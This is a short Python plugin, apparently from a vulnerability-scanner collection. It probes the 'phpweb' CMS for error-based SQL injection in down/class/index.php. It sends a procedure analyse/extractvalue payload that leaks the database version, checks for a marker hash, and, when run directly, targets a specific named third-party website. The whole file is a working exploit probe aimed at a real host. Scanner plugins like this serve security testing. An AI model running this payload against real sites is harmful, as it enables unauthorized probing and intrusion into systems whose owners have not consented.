#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = 'boy'


def assign(service, arg):
    if service == "phpweb":
        return True, arg

def audit(arg):
    code, head, res, errcode,finalurl = curl.curl('%sdown/class/index.php?page=1&catid=0&myord=dtime&myshownums=1/**/procedure/**/analyse(extractvalue(rand(),concat(md5(123),version())),1)' % arg)
    m = res.find("cb962ac59075b964b07152d234b705")
    if m!=-1:
        security_hole('find sql injection:%sdown/class/index.php?page=1&catid=0&myord=dtime&myshownums=1/**/procedure/**/analyse(extractvalue(rand(),concat(md5(123),version())),1)' % arg)
if __name__ == '__main__':
    from dummy import *
    audit(assign('phpweb', 'http://www.slbygs.com/')[1])
